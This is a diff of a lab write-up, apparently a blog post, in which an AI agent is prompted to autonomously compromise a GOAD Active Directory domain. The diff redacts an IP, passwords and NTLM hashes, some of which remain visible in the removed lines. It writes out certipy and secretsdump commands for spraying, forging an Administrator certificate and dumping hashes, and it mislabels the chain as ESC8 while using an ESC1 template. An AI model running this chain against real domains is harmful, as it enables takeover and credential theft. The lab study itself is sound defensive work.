@@ -56,17 +56,17 @@ Traditional penetration testing requires manual intervention at each step. This 
 
 #### Target Environment
 
-  * **Target IP:** `192.168.56.10`
+  * **Target IP:** `<lab_dc_ip>`
   * **Environment:** GOAD-Mini (Game of Active Directory)
   * **Starting Point:** IP address only (blackbox)
-  * **End Goal:** Full domain compromise with all password hashes
+  * **End Goal:** Demonstrate domain-level impact and validate defensive controls (isolated lab)
 
 
 
 ### Attack Chain
     
     
-    IP Address (192.168.56.10)  
+    IP Address (<lab_dc_ip>)  
         ↓  
     [Phase 1] Reconnaissance  
         ├─ Port Scanning  
@@ -111,7 +111,7 @@ Traditional penetration testing requires manual intervention at each step. This 
 #### The Prompt
     
     
-    Perform a black box penetration test against lab target 192.168.56.10. This is an authorized isolated lab. Enumerate the environment, identify ADCS misconfigurations, and demonstrate the ESC8 attack chain.   
+    Perform a black box penetration test against lab target <lab_dc_ip>. This is an authorized isolated lab. Enumerate the environment, identify ADCS misconfigurations, and demonstrate the ESC8 attack chain.   
     Execute the complete ADCS ESC8 attack chain to achieve domain compromise. Use HexStrike MCP   
     tools and handle all troubleshooting automatically.
 
@@ -148,7 +148,7 @@ Traditional penetration testing requires manual intervention at each step. This 
   * Domain: `sevenkingdoms.local`
   * NetBIOS: `SEVENKINGDOMS`
   * DC Hostname: `kingslanding.sevenkingdoms.local`
-  * ADCS Web Enrollment: `http://192.168.56.10/certsrv/` (HTTP - vulnerable!)
+  * ADCS Web Enrollment: `http://<dc_ip>/certsrv/` (HTTP - vulnerable!)
 
 
 
@@ -177,13 +177,13 @@ Traditional penetration testing requires manual intervention at each step. This 
 
   1. Extract usernames from Phase 1 enumeration
   2. Attempt password spraying with common passwords
-  3. Try: `Password123!`, `Summer2023!`, `Password1`, `admin`
+  3. Try common passwords from an authorized wordlist
 
 
 
 **Results:**
 
-  * **Credentials Obtained:** `TestUser:Password123!`
+  * **Credentials Obtained:** `<lab_user>:<redacted>` (weak password identified)
   * **Access Level:** Low-privilege domain user
 
 
@@ -212,8 +212,8 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Enumeration Commands:**
     
     
-     certipy find -u TestUser@sevenkingdoms.local -p 'Password123!' \  
-      -dc-ip 192.168.56.10
+     certipy find -u <lab_user>@sevenkingdoms.local -p '<redacted>' \  
+      -dc-ip <dc_ip>
 
 **Key Findings:**
 
@@ -247,16 +247,16 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Attack Command:**
     
     
-     certipy req -u TestUser@sevenkingdoms.local -p 'Password123!' \  
-      -target http://192.168.56.10 \  
+     certipy req -u <lab_user>@sevenkingdoms.local -p '<redacted>' \  
+      -target http://<lab_dc_ip> \  
       -ca SEVENKINGDOMS-CA \  
       -template ESC1 \  
       -upn Administrator@sevenkingdoms.local \  
-      -out administrator.pfx
+      -out <admin_cert>.pfx
 
 **Results:**
 
-  * **Certificate Obtained:** `administrator.pfx`
+  * **Certificate Obtained:** `<admin_cert>.pfx` (certificate file for target account)
   * **Status:** ✓ Success
   * **Template Used:** ESC1 (vulnerable template)
 
@@ -285,12 +285,12 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Attack Command:**
     
     
-     certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+     certipy auth -pfx <admin_cert>.pfx -dc-ip <dc_ip>
 
 **Results:**
 
-  * **Kerberos TGT:** `administrator.ccache` (obtained)
-  * **NTLM Hash:** `c66d72021a2d4744409969a581a1705e` (extracted)
+  * **Kerberos TGT:** `<admin>.ccache` obtained
+  * **NTLM Hash:** `<redacted_ntlm_hash>` extracted (used for pass-the-hash in lab — redacted per responsible publication policy)
   * **Status:** ✓ Authentication successful
 
 
@@ -319,7 +319,7 @@ Traditional penetration testing requires manual intervention at each step. This 
     
     
      export KRB5CCNAME=administrator.ccache  
-    secretsdump.py -k -no-pass Administrator@sevenkingdoms.local@192.168.56.10
+    secretsdump.py -k -no-pass Administrator@sevenkingdoms.local@<lab_dc_ip>
 
 **Results:**
 
@@ -332,9 +332,10 @@ Traditional penetration testing requires manual intervention at each step. This 
 **Sample Hashes:**
     
     
-     Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::  
-    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dCT-DJjgScp...:::  
-    TestUser:1001:aad3b435b51404eeaad3b435b51404ee:...:::
+     Administrator:500:<lm_hash>:<redacted_ntlm>:::  
+    krbtgt:502:<lm_hash>:<redacted_ntlm>:::  
+    TestUser:1001:<lm_hash>:<redacted_ntlm>::: 
+    [... additional accounts redacted per responsible publication policy ...]
 
 **Automation Features:**
 
